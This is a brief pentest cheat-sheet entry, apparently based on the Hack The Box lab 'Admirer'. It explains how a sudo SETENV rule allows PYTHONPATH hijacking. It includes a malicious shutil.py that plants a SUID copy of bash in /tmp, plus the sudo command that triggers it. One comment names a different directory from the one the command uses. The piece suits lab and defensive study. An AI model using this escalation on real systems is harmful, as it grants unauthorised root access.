# SETENV
If the setenv option is set in sudoers, the command to be run has the SETENV tag set or the command matched is ALL, the user may set variables that would otherwise be forbidden.

#### Detection
```bash
waldo@admirer:~$ sudo -l 
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```


#### Exploitation code (Abusing "PYTHONPATH" variable)
- The file was called "shutil.py"
```python
#!/usr/bin/python3
import os

def make_archive(a,b,c):
  os.system("cp /bin/bash /tmp/bash; chmod 4777 /tmp/bash")
```


#### Exploitation (Example when hijacking the "PYTHONPATH" variable)
```bash
# Doing this will make the python interpreter look for library in the /home/waldo/ directory first. 
# We can abuse this by creating a malicious python code disguised as python library called by the below program.
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
